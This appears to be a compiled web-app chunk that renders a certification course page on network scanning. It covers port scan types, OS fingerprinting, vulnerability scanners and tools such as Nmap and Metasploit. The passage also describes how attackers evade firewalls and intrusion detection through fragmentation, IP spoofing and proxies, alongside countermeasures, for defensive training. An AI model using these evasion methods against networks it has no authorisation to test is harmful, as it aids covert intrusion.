import{_ as s,c as o,a as n,b as e,d as t,o as i}from"./app-FwNIowIB.js";const r="/Se/images/CyberDefensePro/scanning_processes_5.2.2.png",l={};function c(d,a){return i(),o("div",null,a[0]||(a[0]=[n('<h2 id="section-5-2-scanning" tabindex="-1"><a class="header-anchor" href="#section-5-2-scanning"><span>Section 5.2 Scanning</span></a></h2><p>As you study this section, answer the following questions:</p><ul><li>What is scanning?</li><li>Which types of scanning are used to gather information about a target?</li><li>Which tools can you use for scanning?</li><li>What type of information can be gathered with scanning?</li><li>How can organizations protect themselves against scanning attempts?</li></ul><p>In this section, you will learn to:</p><ul><li>Configure a perimeter firewall</li><li>Avoid firewall detection</li><li>Bypass Windows firewall with Metasploit</li><li>Perform an external scan using Zenmap</li><li>Detect open ports with Nmap</li><li>Scan for vulnerabilities on the IoT</li><li>Troubleshoot connectivity with ping and hping3</li></ul><p>The key terms for this section include:</p>',6),e("table",{class:"terms"},[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Term"),e("th",{scope:"col",class:"fw-bold"}," Definition")])]),e("tbody",null,[e("tr",null,[e("td",null,"Scanning"),e("td",null,"The process of actively engaging with a target in an attempt to gather information about a network.")]),e("tr",null,[e("td",null,"Port scan"),e("td",null,"A scan that probes a server or host for open ports.")]),e("tr",null,[e("td",null,"Network scan"),e("td",null,"A scan that finds live computers on a network.")]),e("tr",null,[e("td",null,"Vulnerability scan"),e("td",null,"A scan that finds system weaknesses such as open ports and access points.")])])],-1),e("p",null,"This section helps you prepare for the following certification exam objectives:",-1),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Exam"),e("th",{scope:"col",class:"fw-bold"}," Objective")])]),e("tbody",null,[e("tr",null,[e("td",null,"CompTIA CySA+ CS0-003"),e("td",null,[t("1.1 Explain the importance of system and network architecture concepts in security operations "),e("ul",null,[e("li",null,[t("Network architecture "),e("ul",null,[e("li",null,"Zero trust")])])]),e("p",null,"1.2 Given a scenario, analyze indicators of potentially malicious activity"),e("ul",null,[e("li",null,[t("Network-related "),e("ul",null,[e("li",null,"Bandwidth consumption"),e("li",null,"Rogue devices on the network"),e("li",null,"Scans/sweep"),e("li",null,"Activity on unexpected ports")])]),e("li",null,[t("Application-related "),e("ul",null,[e("li",null,"Anomalous activity")])])]),e("p",null,"1.4 Compare and contrast threat-intelligence and threat-hunting concepts"),e("ul",null,[e("li",null,"Tactics, techniques, and procedures (TTP)"),e("li",null,[t("Threat hunting "),e("ul",null,[e("li",null,[t("Focus areas "),e("ul",null,[e("li",null,"Configurations/misconfigurations")])])])]),e("li",null,"Active defense")]),e("p",null,"2.1 Given a scenario, implement vulnerability scanning methods and concepts"),e("ul",null,[e("li",null,[t("Asset discovery "),e("ul",null,[e("li",null,"Map scans"),e("li",null,"Device fingerprinting")])]),e("li",null,"Special considerations"),e("ul",null,[e("li",null,"Scheduling"),e("li",null,"Operations"),e("li",null,"Performance"),e("li",null,"Sensitivity levels"),e("li",null,"Segmentation"),e("li",null,"Regulatory requirements")]),e("li",null,"Internal vs. external scanning"),e("li",null,"Agent vs. agentless"),e("li",null,"Credentialed vs. non-credentialed"),e("li",null,"Passive vs. active")]),e("p",null,"2.2 Given a scenario, analyze output from vulnerability assessment tools"),e("ul",null,[e("li",null,[t("Tools "),e("ul",null,[e("li",null,[t("Network scanning and mapping "),e("ul",null,[e("li",null,"Angry IP Scanner"),e("li",null,"Maltego")])]),e("li",null,[t("Vulnerability scanners "),e("ul",null,[e("li",null,"Nessus"),e("li",null,"OpenVAS")])]),e("li",null,[t("Multipurpose "),e("ul",null,[e("li",null,"Nmap"),e("li",null,"Metasploit framework (MSF)"),e("li",null,"Recon-ng")])])])])]),e("p",null,"2.3 Given a scenario, analyze data to prioritize vulnerabilities"),e("ul",null,[e("li",null,"Common Vulnerability Scoring System (CVSS) interpretation "),e("li",null,[t("Impact "),e("ul",null,[e("li",null,"Availability")])]),e("li",null,"Validation "),e("li",null,"True/false positives")]),e("p",null,"2.5 Explain concepts related to vulnerability response, handling, and management"),e("ul",null,[e("li",null,[t("Attack surface management "),e("ul",null,[e("li",null,"Penetration testing and adversary emulation")])])]),e("p",null,"3.2 Given a scenario, perform incident response activities"),e("ul",null,[e("li",null,[t("Containment, eradication, and recovery "),e("ul",null,[e("li",null,"Scope")])])])])]),e("tr",null,[e("td",null,"TestOut CyberDefense Pro"),e("td",null,[t("1.1 Monitor networks "),e("ul",null,[e("li",null,"Monitor network traffic"),e("li",null,"Monitor network ports and sockets")]),e("p",null,"2.1 Perform threat analysis"),e("ul",null,[e("li",null,"Review firewall configuration"),e("li",null,"Determine the types of vulnerabilities associated with different attacks")]),e("p",null,"2.2 Detect threats using analytics and intelligence"),e("ul",null,[e("li",null,"Use an intrusion detection system (IDS)"),e("li",null,"Use a protocol analyzer and packet analysis to determine threats")]),e("p",null,"3.1 Implement security controls to mitigate risk"),e("ul",null,[e("li",null,"Detect unpatched systems"),e("li",null,"Configure host firewall policies"),e("li",null,"Implement an intrusion prevention system (IPS)")]),e("p",null,"3.2 Implement system hardening"),e("ul",null,[e("li",null,"Disable unnecessary ports")]),e("p",null,"3.3 Perform penetration tests"),e("ul",null,[e("li",null,"Perform internal penetration testing"),e("li",null,"Perform external penetration testing")]),e("p",null,"4.2 Manage devices"),e("ul",null,[e("li",null,"Secure IoT devices")]),e("p",null,"4.3 Analyze indicators of compromise"),e("ul",null,[e("li",null,"Investigate networks for any signs of compromise")])])])])],-1),n('<h3 id="_5-2-1-scanning-overview" tabindex="-1"><a class="header-anchor" href="#_5-2-1-scanning-overview"><span>5.2.1 Scanning Overview</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Scanning Overview 00:00-01:19 You&#39;ve heard it said that &quot;the best defense is a good offense.&quot; In cybersecurity, this is true too, and proactively scanning your network for weaknesses and vulnerabilities so that you can harden your defenses is an integral part of protecting your network from attacks.</p><p>Vulnerability scanning is the process of scanning a network to find weaknesses in a network&#39;s security. Vulnerability scanning falls into two general categories: external and internal.</p><p>External scans focus on viewing devices and services from &quot;outside&quot; the network or the internet. Externally accessible systems are continuously exposed to malicious actions. So, it&#39;s critical to pay careful attention to externally visible vulnerabilities and swiftly address them when identified. Internal scans provide layered security and can identify areas vulnerable to abuse from the inside, whether from an attacker that made it into the network or from people within the organization.</p><p>There are different classes of vulnerability scanners that include infrastructure, web applications, and cloud infrastructure. Infrastructure vulnerability scanners are software that scans network hosts and intermediate systems for</p><p>vulnerabilities such as patch level, security configuration, rogue devices, and more. A scanner will compile a report and classify any identified vulnerability with an impact warning.</p><p>Scanning Tool Elements 01:19-02:35 Many tools are available to scan for vulnerabilities, and they each have similarities in how they function. Let&#39;s briefly review some important elements of a vulnerability scanning tool. First, a scanner can collect information by authenticating to the device with credentials or scanning without credentials. Both methods have their advantages. A credentialed scan of the device or system can provide the most comprehensive evaluation, and non-credentialed scans can provide insights on external-facing vulnerabilities.</p><p>Next, a scanner can be agent-based or agentless. An agent is a software package that must be deployed to every device to be scanned. Scanners that are agentless are simple to implement. They can collect information from endpoints using protocols like ssh, WMI, or SNMP but may not work with some networks&#39; firewalls. Agent-based scans require more time and effort to deploy and maintain, but they can provide more in-depth information and aren&#39;t dependent on the device being connected to the network.</p><p>Scanners also provide a criticality ranking, a ranking of findings based on a standardized scoring mechanism. These rankings are intended to help prioritize remediation efforts.</p><p>Infrastructure scanners can be scheduled for different portions of the network to reduce impact and facilitate analysis.</p><p>Network Scans 02:35-03:38 Now that we&#39;ve discussed elements of vulnerability scanners, let&#39;s look at some types of scanning processes.</p><p>First, let&#39;s talk about network scans. Network scans are used to find live computers on a network. One technique for this type of scan is called wardialing, which uses a modem to dial a large block of numbers attempting to connect to a system. If the scan gets a response, it accepts the connection, and an access point to the network is identified.</p><p>Even though much of the dial-up era is gone, there are still modems used for fax machines, multi-purpose copiers, backup for high-speed internet, and video meetings.</p><p>Another way to find live systems is to use a very common network scanning tool called Ping. Ping works by sending an ICMP message from one system to another. Based on the ICMP reply, you can tell whether a system is live and how quickly the packets traveled from one host to another. A ping sweep can be used to scan a range of IPs in search of live systems. Because ping and ping sweeps are common, it&#39;s best to block pings at the firewall or set their IDSs to receive ping alerts.</p><p>Port Scans 03:38-06:26 Another scanning process is a port scan. This is used to find open or weak ports in a network. The most common tool for this is Nmap. If you recall, TCP is a connection-oriented protocol that uses a three-way handshake to establish a connection with a system port.</p><p>TCP packets have flag indicators. Two of these indicators are SYN and ACK. SYN starts a connection between two systems. ACK acknowledges that a packet has been received. There are other flag options as well. Any of these indicators can be turned on or off using a packet crafter.</p><p>The three-way handshake occurs when you&#39;re trying to use TCP to connect to a port and has three steps. For example, Computer 1 wants to connect with Computer 2. Computer 1 sends a SYN packet to Computer 2. Computer 2 receives the packet and sends a SYN/ACK packet to Computer 1. Computer 1 receives the SYN/ACK packet and replies with an ACK packet. The connection is then complete.</p><p>A full connect, or a full-open scan, completes a full three-way handshake on all ports. Open ports respond with a SYN/ACK, and closed ports respond with an RST flag, ending the attempt.</p><p>A stealth scan, also known as a half-open scan, sends a SYN packet to a port. The three-way handshake doesn&#39;t occur because the original system doesn&#39;t reply with the final ACK, but you&#39;ve discovered an open port. The SYN scan is hard, but not impossible, to detect if an attacker uses it to discover open ports in your network. If the attacker floods your network with SYN packets, a good IDS detects and reports this anomaly.</p><p>An Xmas tree scan gets its name because all the flags are turned on, and the packet is lit like a Christmas tree. Your network has no idea what to do with this packet, so it&#39;s either ignored or dropped. If an RST packet is sent, you know the port is closed. If a response isn&#39;t received, the port might be open.</p><p>There are a few more assessment tools that are good to be familiar with. The first is called Angry IP Scanner, a graphical network scanning tool. It can quickly identify connected devices, configuration information, and software versions.</p><p>Next is Maltego, which helps identify relationships among entities of many types. Maltego uses transforms to collect and apply intelligence data to an investigation automatically.</p><p>Then we have the Metasploit framework. It&#39;s a collection of tools that can be used to validate the risk of a vulnerability by exploiting it. It can provide ways to gain unauthorized access to a wide range of systems and software with the least amount of complexity. This tool can help find vulnerabilities and assess their risk.</p><p>Finally, we have Recon-ng, which is like Metasploit but focuses on web-based reconnaissance. It can quickly reveal an organization&#39;s external footprint, such as IP addresses, subdomains, software versions, and other attributes. It can also be used to test for compliance with policy and security mandates.</p><p>Summary 06:26-07:00 Well, that&#39;s it for this lesson. In this lesson, we reviewed several aspects of vulnerability assessment through scanning. We started this lesson by explaining the difference between internal and external scanning. Next, we went over important scanning tool elements. Then, we discussed different types of scanning, such as network scans and port scans. We finished the lesson by mentioning four more useful scanning tools, including Angry IP Scanner, Maltego, Metasploit, and Recon-ng. Understanding what the scanning tools are and how they work is a critical part of vulnerability assessment.</p><h3 id="_5-2-2-scanning-process-facts" tabindex="-1"><a class="header-anchor" href="#_5-2-2-scanning-process-facts"><span>5.2.2 Scanning Process Facts</span></a></h3><p>Scanning is the process of connecting to a system to gather information. Through scanning, you can determine live hosts, open ports, operating systems in use, running services, running processes, implemented patches, and firewalls.</p><p>This lesson covers the following topics:</p><ul><li>Internal vs. external scans</li><li>Network scans</li><li>TCP scans</li><li>Port scans</li><li>Operating system fingerprinting</li><li>Vulnerability scanning</li><li>Mapping/Enumeration and scope</li></ul><h4 id="internal-vs-external-scans" tabindex="-1"><a class="header-anchor" href="#internal-vs-external-scans"><span>Internal vs. External Scans</span></a></h4><p>Vulnerability scanning generally falls into two major categories: internal and external. External scans focus on the view of devices and services from the &quot;outside&quot; of the network, broadly referring to the internet, whereas internal scans focus on the view from the &quot;inside.&quot;</p><ul><li>Externally accessible (internet-facing) systems are continuously pushed, poked, probed, scanned, enumerated, subjected to automated exploits, fingerprinted, and exposed to many other malicious actions. Paying close and careful attention to externally visible vulnerabilities is essential, and the approaches used to address any identified vulnerabilities should be swift. Internal scans are also important to protect systems from abuse from internal threats and to provide layered security. For example, if an attacker makes it past external protections, their job should still be difficult even if they have made it to the &quot;inside.&quot;</li><li>Internal scans should include detailed, comprehensive vulnerability information. Responses to identified vulnerabilities are often more methodical, allowing for more complicated testing and evaluation of patches and workarounds in test environments before deploying into production.</li></ul><h4 id="network-scans" tabindex="-1"><a class="header-anchor" href="#network-scans"><span>Network Scans</span></a></h4><table><thead><tr><th scope="col" class="fw-bold"> Scan Type</th><th scope="col" class="fw-bold"> Description</th></tr></thead><tbody><tr><td>Wardialing</td><td>The scan dials a large block of phone numbers using a modem and attempts to locate other systems connected to a modem. If the modem gets a response, it can establish a connection. Modems are still often used for fax machines and multi-purpose copiers and as a backup for high-speed internet.</td></tr><tr><td>ping</td><td>ping works by sending an ICMP message from one system to another. Based on the ICMP reply, you know whether the system is live and how quickly the packets travel from one host to another.</td></tr><tr><td>ping sweep</td><td>A ping sweep scans a range of IPs to look for live systems. You can use ping sweeps to help build a network inventory. A ping sweep can also alert the security system and potentially trigger an alarm or block the ping sweep.</td></tr></tbody></table><h2 id="tcp-flags" tabindex="-1"><a class="header-anchor" href="#tcp-flags"><span>TCP Flags</span></a></h2><p>TCP is a connection-oriented protocol that uses a three-way handshake to establish a connection with a system port. The header portion of a TCP packet contains flag indicators.</p><p>Two of these indicators are SYN and ACK. SYN starts a connection between two systems. ACK acknowledges that a packet has been received. There are other flag options as well. A packet crafter can turn any of these indicators on or off.</p><p>The three-way handshake occurs when you use TCP to connect to a port. As indicated by the name, the handshake has three steps:</p><ol><li>Computer 1 sends a SYN packet to Computer 2.</li><li>Computer 2 receives the packet and sends a SYN/ACK packet to Computer 1.</li><li>Computer 1 receives the SYN/ACK packet and replies with an ACK packet, completing the connection.</li></ol><p>The following table describes TCP flags.</p><table><thead><tr><th scope="col" class="fw-bold"> Flag Type</th><th scope="col" class="fw-bold"> Description</th></tr></thead><tbody><tr><td>SYN</td><td>Starts a connection between hosts.</td></tr><tr><td>ACK</td><td>Acknowledges the receipt of a packet.</td></tr><tr><td>FIN</td><td>Indicates that no additional information will be sent.</td></tr><tr><td>RST</td><td>Resets a connection.</td></tr><tr><td>URG</td><td>Flags a packet as urgent.</td></tr><tr><td>PSH</td><td>Directs the sending system to send buffered data.</td></tr></tbody></table><h4 id="port-scans" tabindex="-1"><a class="header-anchor" href="#port-scans"><span>Port Scans</span></a></h4><p>After malicious actors have found a target, they will use port scans to obtain access to and information about the system.</p><table><thead><tr><th scope="col" class="fw-bold"> Scan Type</th><th scope="col" class="fw-bold"> Description</th></tr></thead><tbody><tr><td>Full open scan</td><td>The full open scan completes a full three-way handshake on all ports. Open ports respond with a SYN/ACK, and closed ports respond with an RST flag, ending the attempt. <br><br> This type of scan leaves a distinct digital footprint, so it is not used often.</td></tr><tr><td>Half-open scan</td><td>A half-open scan, also known as a stealth scan, sends an SYN packet to a port. If a SYN/ACK packet is returned, the attacker knows the port is open. <br><br> The three-way handshake does not occur because the attacker does not reply with the final ACK. Because the final ACK packet is not sent, a connection is not made, and there is no security log.</td></tr><tr><td>Xmas tree scan</td><td>An Xmas tree scan gets its name because all flags are turned on. The packet is lit up like a Christmas tree. The recipient has no idea what to do with this packet, so either the packet is ignored or dropped. <br><br> A returned RST packet indicates the port is closed. No response indicates the port may be open.</td></tr><tr><td>FIN scan</td><td>The packet is sent with the FIN flag set. This allows the packet to pass through firewalls and onto the intended target without attracting much attention. If a port is open, there will be no response. If the port is closed, an RST response is returned.</td></tr><tr><td>NULL scan</td><td>The packet is sent with no flags set. If the port is open, there is no response. If the ports are closed, an RST response is returned.</td></tr><tr><td>Idle scan</td><td>The attacker finds a target machine but wants to avoid getting caught. The attacker finds another system to take the blame. The blamed system is called a zombie machine because it is disposable and creates a good distraction. <br><br> The scan directs all requests through the zombie machine. If that zombie machine is flagged, the hacker creates another zombie machine and continues to scan.</td></tr></tbody></table><h4 id="operating-system-fingerprinting" tabindex="-1"><a class="header-anchor" href="#operating-system-fingerprinting"><span>Operating System Fingerprinting</span></a></h4><p>An attacker may be able to determine the operating system of a target machine by reviewing packet information. The review technique, referred to as fingerprinting, relies on small differences in packets created by various operating systems.</p><p>Differences can be found by examining the TTL values, TCP window size, DHCP requests, ICMP requests, HTTP packets, and open port patterns.</p><h4 id="vulnerability-scanning" tabindex="-1"><a class="header-anchor" href="#vulnerability-scanning"><span>Vulnerability Scanning</span></a></h4><p>An infrastructure vulnerability scanner is a type of software that scans network hosts (client and servers) and intermediate systems (routers, switches, access points, and firewalls) for data such as patch level, security configuration and policies, network shares, unused accounts, weak passwords, rogue devices, antivirus configuration, and so on. A scanner can be implemented purely as software or as a security appliance connected to the network.</p><p>Other classes of scanners aim to identify web application vulnerabilities specifically. Tools such as Nikto look for known software exploits, such as SQL injection and XSS, and may also analyze source code and database security to detect insecure programming practices. There are also scanners designed to assess cloud infrastructure.</p><p>Scanners compile a report and classify each identified vulnerability with an impact warning. Each scanner is configured with a database of known vulnerabilities. Most tools also suggest remediation options. There are many tools available to perform vulnerability scans, and each operates in a similar fashion. The selection of the best tool depends upon many factors, including:</p><ul><li>Policy requirements</li><li>Budget</li><li>Skills</li><li>Technology makeup of the environment</li><li>Reporting needs</li></ul><p>The following table lists some important elements of a vulnerability scanning tool.</p><table><thead><tr><th scope="col" class="fw-bold"> Element</th><th scope="col" class="fw-bold"> Description</th></tr></thead><tbody><tr><td>Credentialed/Noncredentialed</td><td>Vulnerability scanners can collect information from devices with or without credentials, allowing the scanner to authenticate to the device. Both methods have advantages. Noncredentialed scans are simple to implement, produce a relatively low impact on the device, and provide insight regarding what vulnerabilities are discoverable to non-authenticated users, for example, someone with access to the network only. Credentialed scans provide the most comprehensive evaluation of devices. By authenticating to the device, the scanner can enumerate all installed software, the file system, configuration data, user accounts, and many other attributes. Special care is needed when using credentialed scans, as the most effective scanner credentials also have privileged access. If the scanner does not correctly protect the credentials or staff are not careful to protect them, they can be abused or potentially exposed and stolen. Accounts such as root, Domain Administrator, or Administrator are inappropriate for vulnerability scanning. Scanning endpoints should be done with purpose-specific and carefully provisioned credentials, granting only the necessary access.</td></tr><tr><td>Agents/Agentless</td><td>Vulnerability scans can evaluate endpoints using two methods, agent based or agentless. Agentless scans can be the simplest to implement, as the scanner can collect information from endpoints using protocols such as ssh, WMI, or SNMP. Some organizations do not allow the use of WMI or SNMP in response to risks associated with these protocols. Additionally, collecting data can become complicated when network firewalls are in the line of communication between the vulnerability scanner and the endpoints. Agent-based scans require the installation of small, special-purpose software utilities designed to collect information from the endpoint and pass it to the vulnerability scanner. The advantages of agent-based scanning include improved vulnerability and host configuration data, less processing overhead on the vulnerability scanner server, and simplified communication across network firewalls. Agent-based scans require the deployment and installation of the agent software, which requires time and effort to test, deploy, and maintain. Adding agents to endpoints also adds a new attack vector and additional software to track and patch.</td></tr><tr><td>Active vs. Passive</td><td>Identifying vulnerabilities can be accomplished in many ways, and a vulnerability scanner is just one of them. Directly interacting with a device or software to identify vulnerabilities is called active scanning. Examples of active scanning include using a vulnerability scanner, enumerating services, performing banner grabbing, content enumeration, or using a web application scanner such as Burp Suite or OWASP ZAP. Passive scanning describes methods used to identify vulnerabilities without direct interaction with a device or software. The primary example of this is network packet capture. By inspecting the traffic to and from a device, issues such as insecure protocols, cleartext credentials, inadequate encryption methods, DNS query data, and other problems are easily identifiable.</td></tr><tr><td>Criticality Ranking</td><td>The results of a vulnerability scan can provide a great deal of information regarding identified vulnerabilities and include rankings of the items based on a scoring mechanism in order to help prioritize remediation efforts. While the scanner will provide standardized scores that provide an effective mechanism to prioritize remediation efforts accurately, the ranking and prioritization of vulnerabilities warrants careful analysis as some items ranked as informational or low priority may reflect areas highly concerning within the context of one organization to another.</td></tr></tbody></table><h4 id="mapping-enumeration-and-scope" tabindex="-1"><a class="header-anchor" href="#mapping-enumeration-and-scope"><span>Mapping/Enumeration and Scope</span></a></h4><p>While there are dedicated enumeration and wireless assessment tools, most infrastructure scanners can perform enumeration in the form of a host discovery scan. Unlike a simple enumeration tool, however, an infrastructure scanner can be configured with more reliable host discovery features, such as installing an agent or providing credentials for the scanner to authenticate and start a session with the target of the assessment.</p><p>The <em>scope</em> of a scan refers to the range of hosts or subnets included within a single scan job. The scope is configured in the scan as a single IP address or range of IP addresses. For a large network, it is sensible to schedule scans of different portions of the network to occur at different times. This will reduce the impact on network performance and make it easier to analyze the results of each scan. Scans of limited scope can also be used to identify particular issues or meet a particular compliance goal. Asset criticality might also affect scanning scope, with targeted scans of critical assets being scheduled more often.</p><p><img src="'+r+'" alt="A greenbone security manager dashboard."></p><p>Results from a discovery scan are run by the Greenbone Community Edition vulnerability manager, incorporating the OpenVAS scan engine. This uncredentialed discovery scan has not identified the OS type of each host. (Screenshot courtesy of Greenbone Community Edition greenbone.net/en/community-edition.)</p><h3 id="_5-2-3-scanning-tool-facts" tabindex="-1"><a class="header-anchor" href="#_5-2-3-scanning-tool-facts"><span>5.2.3 Scanning Tool Facts</span></a></h3><p>This lesson covers the following topics:</p><ul><li>Network mapping tools</li><li>Scanning tools</li></ul><h4 id="network-mapping-tools" tabindex="-1"><a class="header-anchor" href="#network-mapping-tools"><span>Network Mapping Tools</span></a></h4><p>The following tools can be used for mapping network resources. Many are marketed as a system inventory tool for use inside an organization, but, as with most tools, they can serve multiple purposes depending on the user&#39;s intentions.</p>',65),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Tool"),e("th",{scope:"col",class:"fw-bold"}," Description")])]),e("tbody",null,[e("tr",null,[e("td",null,"NetAuditor"),e("td",null,"NetAuditor reports, manages, and diagrams network configurations.")]),e("tr",null,[e("td",null,"SolarWinds Network Topology Manager"),e("td",null,"SolarWinds Network Topology Manager provides automated network discovery and mapping.")]),e("tr",null,[e("td",null,"Scany"),e("td",null,"Scany is a scanner application for iOS devices. It scans networks, websites, and ports to find open network devices. It can obtain domain and network names and includes basic networking utilities such as ping, traceroute, and whois.")]),e("tr",null,[e("td",null,"Maltego"),e("td",null,"Maltego is a very sophisticated visualization tool that helps investigators quickly identify relationships among entities of many types. Maltego can help in many investigations, from people and social engineering to malware analysis. Maltego uses transforms to collect and apply intelligence data to an investigation automatically.")])])],-1),e("h4",{id:"scanning-tools",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#scanning-tools"},[e("span",null,"Scanning Tools")])],-1),e("p",null,"The following tools can be used during the scanning phase of your investigation.",-1),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Tool"),e("th",{scope:"col",class:"fw-bold"}," Description")])]),e("tbody",null,[e("tr",null,[e("td",null,"CurrPorts"),e("td",null,"CurrPorts lists all open UDP and TCP/IP ports on your computer. It also provides information about the process that opened the port, the user who created it, and the time the port was created.")]),e("tr",null,[e("td",null,"ping"),e("td",null,"ping uses Internet Control Message Protocol (ICMP) messaging to determine whether a remote system is live.")]),e("tr",null,[e("td",null,"hping3"),e("td",null,[t("The hping3 command sends packets across a network and can also create custom packets that can analyze the host. In addition to the normal ICMP pings, hping3 supports TCP and UDP, has a traceroute mode, and can send and receive files. This tool was primarily designed for the Linux operating system but does have cross-platform capabilities. "),e("p",null,"Common options used with hping3 include:"),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Option"),e("th",{scope:"col",class:"fw-bold"}," Description")])]),e("tbody",null,[e("tr",null,[e("td",null,[e("b",{class:"fw-bold"},"-c"),t(),e("i",{class:"fs-italicize"},"n")]),e("td",null,[t("Stops sending ping requests after "),e("i",{class:"fs-italicize"},"n"),t(" number of seconds.")])]),e("tr",null,[e("td",null,[e("b",{class:"fw-bold"},"-n")]),e("td",null,"Use a numeric output only. No attempt will be made to look up symbolic names for host addresses.")])])])])]),e("tr",null,[e("td",null,"Colasoft"),e("td",null,"Colasoft is a packet crafting software that can modify flags and adjust other packet content.")]),e("tr",null,[e("td",null,"Angry IP Scanner"),e("td",null,"Angry IP Scanner is a network scanner. It scans local and remote networks and returns an IP range via a command line interface. The executable file (ipscan.exe) can quickly scan a network to identify connected devices, including configuration information and software versions.")]),e("tr",null,[e("td",null,"SolarWinds Port Scanner"),e("td",null,"SolarWinds Port Scanner is a command line tool that provides a list of open, closed, or filtered ports.")]),e("tr",null,[e("td",null,"IP-Tools"),e("td",null,"IP-Tools has 20 scanning utilities, including SNMP Scanner, UDP Scanner, Trace, Finger, Telnet, IP-Monitor, and Trap Watcher. The program supports multitasking so that you can use all utilities at once. IP-Tools is designed to work on a Windows system.")]),e("tr",null,[e("td",null,"Metasploit"),e("td",null,"Metasploit is a powerful collection of tools. It can be used to validate the risk of a vulnerability by exploiting it. In particular, the Pro version of Metasploit includes advanced features and a web-based user interface for identifying and validating vulnerabilities. Many Metasploit tools and utilities are known to modern anti-malware software, which will alert and block attacks it initiates.")]),e("tr",null,[e("td",null,"Recon-ng"),e("td",null,[t("Recon-ng has a syntax and use that parallels Metasploit Framework, but Recon-ng is focused on performing web-based reconnaissance. Recon-ng uses workspaces to help organize information, and its functionality can be greatly expanded through the use of numerous add-on modules. "),e("br"),e("br"),t(" Recon-ng can speed up the collection of host and domain information, quickly revealing an organization's external footprint to an attacker, such as IP addresses, subdomains, software versions, and many other attributes. It can also be used by analysts to review and monitor an organization's footprint to ensure it complies with policy and other security mandates.")])])])],-1),n('<h3 id="_5-2-4-scanning-considerations" tabindex="-1"><a class="header-anchor" href="#_5-2-4-scanning-considerations"><span>5.2.4 Scanning Considerations</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Scanning Considerations 00:00-00:16 A hacker relies on stealth for success. The longer he or she remains hidden, the more successful they&#39;ll be. So, how can you keep a hacker from successfully poking around your network without getting caught?</p><p>Scanning Considerations 00:16-00:51 First, hackers are strategic when selecting which scanning tools and methods to use. They carefully consider the strengths and weaknesses of each scan type. Selecting the wrong method not only takes up valuable time, but also increase the chances that they&#39;ll get caught.</p><p>They consider the time of day that they&#39;ll perform the scan. They might choose to scan during the busiest time of day to blend in with the crowd. Scanning late at night or on weekends are other options. This represents the least likely time to be discovered. There isn&#39;t necessarily a right or wrong answer to these questions, and their decisions could vary from one company to another.</p><p>Evasion 00:51-02:58 Of course, even the stealthiest of hackers comes across a few obstacles. After all, firewalls and security measures are typically in place to keep people like them out. When you block scanning attempts, hackers have a few options you must be aware of. These include scanning with ACK, fragmenting packets, spoofing IP addresses, and using a proxy.</p><p>If a hacker thinks they&#39;re being blocked by a firewall, they can run an ACK scan. This scan helps them determine whether the firewall is stateful or stateless, and whether or not the ports are open. In an ACK scan, only the ACK flag is set. If a port is unfiltered, both open and closed ports return an RST packet. If a port is filtered, it either returns an error message or no response at all. Then there&#39;s fragmenting, which is probably the most common method for avoiding detection. The hacker still sends packets, but they just break them apart so intrusion detection systems don&#39;t know what they are.</p><p>Let&#39;s take a look at this picture. Can you tell what it is? Probably not. To the casual onlooker, it appears to be meaningless. To the packet creator, though, there&#39;s a very clear picture that&#39;s been disassembled to fly quietly under the radar. This is exactly what happens when a hacker fragments packets. Another evasion technique involves spoofing an IP address. Many scanning tools have the functionality to recraft the packet so that the source address reflects a different IP address. The scan is sent to the recipient, the feedback is returned to the fake IP address, and there&#39;s no record of the hacker&#39;s actual IP address sending the requests.</p><p>As you probably recall from your networking experience, a proxy serves as a network&#39;s less vulnerable access point. Typically, proxies are placed in networks to keep external users from accessing the internal network. Remember that a malicious actor can use this same technique to avoid detection. The proxy would filter incoming and outgoing traffic, provide them with anonymity, and shield them from possible detection. These proxies are fairly disposable and easily dropped and replaced once discovered.</p><p>Countermeasures 02:58-05:11 This may sound like doom and gloom, but fear not, there are ways to fight back. A malicious actor counts on a company to be lazy, uneducated, or both. By not being either, you can make a hacker&#39;s job land on the wrong side of the cost/benefit equation. The harder a hacker has to work, the bigger the payoff has to be or it&#39;s a waste of time. Time is money—this is universal.</p><p>One of the most logical countermeasures is to perform regular vulnerability scans and then to have someone go over these scans in search of areas in need of remediation. Various tools have been designed to scan ports, banners, coding, and other high-target areas within a network. But like virus scanners and malware detectors, a vulnerability scan is only as good as the data it returns. If a vulnerability isn&#39;t included in the list of issues being scanned for, an all clear result could be misleading. So, in addition to keeping your scanning tools up to date, you want to use a variety of tools to be sure you&#39;re covering as much ground as possible. Also, keep in mind that if these tools are available to the companies you&#39;re working for, they&#39;re also available to hackers. Keep in mind, most malicious actors are using known attacks. Zero-day attacks aren&#39;t an everyday occurrence.</p><p>Banner grabbing is a serious security issue. What can a network admin do to prevent this? First, disable banners, or portions of them at least. Several utilities are available to help change or even remove the banners&#39; contents. Second, hide file extensions. File extensions tell everyone which software is being used to create a web page. Hiding the file extension provides one less bit of information to an intruder. A third option for banner grabbing prevention is to enable custom error pages. This way, you have full control over what scanners can and cannot see when they trigger an error message. This follows the Zero Trust model.</p><p>Using the information gathered in the reconnaissance and scanning phases, a hacker can gain a lot of information about a network&#39;s mapping without even stepping foot in the building. Once again, we&#39;re reminded of the importance of proper network documentation. A hacker should never have a better mapping of a network than the administrator!</p><p>Summary 05:11-05:31 That&#39;s it for this lesson. In this lesson, we learned about the tools most used by hackers, like spoofing IP addresses and fragmenting packets to avoid detection. We&#39;ve also talked about a few countermeasures that can make a hacker&#39;s job more trouble than it&#39;s worth.</p><h3 id="_5-2-5-scanning-considerations-facts" tabindex="-1"><a class="header-anchor" href="#_5-2-5-scanning-considerations-facts"><span>5.2.5 Scanning Considerations Facts</span></a></h3><p>This lesson covers the following topics:</p><ul><li>Scanning considerations</li><li>Evasion</li><li>Vulnerability scans</li><li>Banner grabbing prevention</li><li>Performance considerations</li><li>Vulnerability scan scheduling</li><li>Operations</li><li>Intrusion Prevention System (IPS), Intrusion Detection System (IDS), and firewall settings</li><li>Data sensitivity levels</li></ul><h4 id="scanning-considerations" tabindex="-1"><a class="header-anchor" 